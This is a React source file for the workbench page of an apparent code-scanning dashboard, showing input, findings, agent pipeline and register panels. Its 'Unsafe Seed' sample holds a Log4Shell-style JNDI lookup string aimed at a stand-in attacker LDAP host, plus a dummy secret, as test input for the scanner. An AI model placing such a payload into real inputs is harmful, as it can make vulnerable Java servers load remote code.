import { useState } from 'react';
import { useKernelStore } from '@/hooks/use-kernel';
import { Play, RotateCcw, AlertTriangle, ShieldCheck, Zap, Activity } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Textarea } from '@/components/ui/textarea';
import { Badge } from '@/components/ui/badge';
import { SystemLog, MatrixRain } from '@/components/ui-extras';

export default function Workbench() {
  const { execute, activeRun, isRunning, resetRun } = useKernelStore();
  
  const [source, setSource] = useState(
    '// Safe Concept\nfor (let i=0; i<data.length; i++) {\n  let v = data[i];\n  pow(v, 2.0);\n}'
  );

  const loadUnsafe = () => {
    setSource('// Unsafe Concept\nconst INGEST_SECRET = "anything";\nfor (let i=0; i<data.length; i++) {\n  pow(-2,0.5);\n  // Payload test\n  ${jndi:ldap://attacker}\n}');
  };

  const handleExecute = () => {
    execute(source);
  };

  return (
    <div className="flex flex-col gap-4 h-full">
      <div className="flex-none flex items-center justify-between">
        <h2 className="text-xl font-bold tracking-tight uppercase flex items-center gap-2">
          <Zap className="w-5 h-5 text-primary" />
          Primary Workbench
        </h2>
        <div className="flex gap-2">
          <Button data-testid="button-load-safe-seed" variant="outline" size="sm" onClick={() => setSource('// Safe Concept\nfor (let i=0; i<data.length; i++) {\n  pow(data[i], 2.0);\n}')}>
            Safe Seed
          </Button>
          <Button data-testid="button-load-unsafe-seed" variant="outline" size="sm" onClick={loadUnsafe} className="text-destructive border-destructive/50 hover:bg-destructive/10">
            Unsafe Seed
          </Button>
        </div>
      </div>

      <div className="flex-1 grid grid-cols-1 lg:grid-cols-12 gap-4 min-h-0">
        
        {/* LEFT COLUMN: Input & Engine Status */}
        <div className="lg:col-span-4 flex flex-col gap-4 h-full">
          <div className="flex-1 border border-border bg-card relative group flex flex-col">
            <div className="bg-muted px-3 py-2 border-b border-border flex justify-between items-center text-xs font-bold uppercase tracking-wider">
              <span>Source Ingestion</span>
              {isRunning && <span className="text-primary animate-pulse">Processing...</span>}
            </div>
            <Textarea 
              data-testid="input-source"
              value={source}
              onChange={(e) => setSource(e.target.value)}
              className="flex-1 resize-none border-0 rounded-none bg-transparent font-mono text-sm focus-visible:ring-0 p-4"
              placeholder="Enter concept or raw code..."
              spellCheck={false}
              disabled={isRunning || !!activeRun}
            />
            {(!activeRun && !isRunning) && (
              <div className="p-3 border-t border-border bg-background/50">
                <Button data-testid="button-execute-pipeline" onClick={handleExecute} className="w-full gap-2 font-bold tracking-widest bg-primary text-primary-foreground hover:bg-primary/80 rounded-none">
                  <Play className="w-4 h-4" /> INGEST & TRANSMUTE
                </Button>
              </div>
            )}
            {activeRun && (
              <div className="p-3 border-t border-border bg-background/50">
                <Button data-testid="button-reset-trial" onClick={resetRun} variant="outline" className="w-full gap-2 font-bold tracking-widest rounded-none">
                  <RotateCcw className="w-4 h-4" /> RESET TRIAL
                </Button>
              </div>
            )}
          </div>

          <div className="flex-none border border-border bg-card flex flex-col h-1/3">
            <div className="bg-muted px-3 py-2 border-b border-border text-xs font-bold uppercase tracking-wider">
              System Telemetry
            </div>
            <div className="p-3 overflow-y-auto flex-1 bg-black/50 relative">
              <MatrixRain />
              {activeRun ? (
                <SystemLog items={activeRun.telemetry} />
              ) : (
                <div className="flex h-full items-center justify-center text-muted-foreground text-xs text-center">
                  Awaiting ingestion...
                </div>
              )}
            </div>
          </div>
        </div>

        {/* RIGHT COLUMN: Results & Agents */}
        <div className="lg:col-span-8 flex flex-col gap-4 h-full overflow-hidden">
          
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4 flex-none">
            {/* Promotion Status */}
            <div className="border border-border bg-card p-4 flex flex-col justify-center relative overflow-hidden">
              <div className="text-xs uppercase text-muted-foreground mb-2 font-bold tracking-widest z-10 relative">Promotion State</div>
              {!activeRun ? (
                <div className="text-2xl text-muted-foreground font-light">STANDBY</div>
              ) : (
                <div className="flex flex-col gap-2 z-10 relative">
                  <div className="flex items-center gap-3">
                    {activeRun.promotion === 'promoted' ? (
                      <ShieldCheck className="w-8 h-8 text-green-500" />
                    ) : (
                      <AlertTriangle className="w-8 h-8 text-destructive" />
                    )}
                    <span className={`text-2xl font-bold uppercase ${activeRun.promotion === 'promoted' ? 'text-green-500' : 'text-destructive'}`}>
                      {activeRun.status}
                    </span>
                  </div>
                  <p className="text-sm text-foreground/80">{activeRun.promotionReason}</p>
                </div>
              )}
              {activeRun && activeRun.promotion === 'promoted' && (
                <div className="absolute inset-0 bg-green-500/5 animate-pulse pointer-events-none" />
              )}
              {activeRun && activeRun.promotion === 'blocked' && (
                <div className="absolute inset-0 bg-destructive/10 animate-pulse pointer-events-none" />
              )}
            </div>

            {/* Findings Ledger */}
            <div className="border border-border bg-card flex flex-col max-h-40 overflow-hidden">
              <div className="bg-muted px-3 py-2 border-b border-border text-xs font-bold uppercase tracking-wider flex justify-between">
                <span>Findings Ledger</span>
                {activeRun && <span>{activeRun.findings.length} Hits</span>}
              </div>
              <div className="p-3 overflow-y-auto flex-1 text-sm">
                {!activeRun ? (
                  <div className="text-muted-foreground text-xs text-center mt-4">No active trial</div>
                ) : activeRun.findings.length === 0 ? (
                  <div className="text-green-500 text-xs text-center mt-4 border border-green-500/20 p-2 bg-green-500/5">
                    No impurities detected. Code verified.
                  </div>
                ) : (
                  <div className="space-y-3">
                    {activeRun.findings.map((f) => (
                      <div key={f.id} className="border border-destructive/30 bg-destructive/5 p-2 flex flex-col gap-1">
                        <div className="flex justify-between items-center">
                          <Badge variant="destructive" className="rounded-none text-[10px]">{f.category}</Badge>
                          <span className="text-[10px] text-muted-foreground font-mono">{f.locator}</span>
                        </div>
                        <div className="text-xs">{f.message}</div>
                        <div className="text-[10px] text-destructive/80 font-mono mt-1 break-all bg-black/50 p-1">Evidence: {f.evidence}</div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            </div>
          </div>

          {/* Bounded Agents Dashboard */}
          <div className="flex-1 border border-border bg-card flex flex-col min-h-0">
            <div className="bg-muted px-3 py-2 border-b border-border text-xs font-bold uppercase tracking-wider flex items-center gap-2">
              <Activity className="w-4 h-4 text-primary" />
              Bounded Agents / Registers
            </div>
            
            <div className="flex-1 p-4 overflow-y-auto grid grid-cols-1 md:grid-cols-2 gap-6 bg-[#050508]">
              {!activeRun ? (
                <div className="col-span-full flex h-full items-center justify-center text-muted-foreground">
                  Awaiting ingestion phase to spin up agent pipeline...
                </div>
              ) : (
                <>
                  <div className="space-y-4">
                    <h3 className="text-xs text-muted-foreground uppercase tracking-widest border-b border-border/50 pb-1">Agent Pipeline</h3>
                    {activeRun.agents.map((a) => (
                      <div key={a.id} className="flex flex-col gap-1 p-2 border border-border bg-card/50">
                        <div className="flex justify-between items-center">
                          <span className="font-bold text-sm text-primary">{a.name}</span>
                          <span className={`text-xs px-2 py-0.5 uppercase tracking-wider ${
                            a.status === 'success' ? 'text-green-500 bg-green-500/10' :
                            a.status === 'blocked' ? 'text-destructive bg-destructive/10' :
                            a.status === 'unsupported' ? 'text-violet-400 bg-violet-500/10' :
                            'text-orange-500 bg-orange-500/10'
                          }`}>
                            {a.status}
                          </span>
                        </div>
                        <div className="text-xs text-muted-foreground">{a.role}</div>
                        <div className="flex justify-between mt-1 text-[10px] font-mono">
                          <span>{a.summary}</span>
                          <span className="text-secondary">{a.durationMs}ms</span>
                        </div>
                      </div>
                    ))}
                  </div>
                  
                  <div className="space-y-4">
                    <h3 className="text-xs text-muted-foreground uppercase tracking-widest border-b border-border/50 pb-1">Hardware Registers Snapshot</h3>
                    <div className="grid grid-cols-2 gap-2">
                      {activeRun.registers.map((r) => (
                        <div key={r.register} className="border border-border/50 bg-black p-2 flex flex-col">
                          <div className="flex justify-between items-end">
                            <span className="text-xs font-bold text-secondary">{r.register}</span>
                            <span className="text-[10px] text-muted-foreground">Agent {r.agentId}</span>
                          </div>
                          <span className="text-sm font-mono mt-1 break-all truncate">{r.value}</span>
                          <span className="text-[10px] text-muted-foreground truncate mt-1" title={r.meaning}>{r.meaning}</span>
                        </div>
                      ))}
                    </div>
                  </div>
                </>
              )}
            </div>
          </div>
          
        </div>
      </div>
    </div>
  );
}
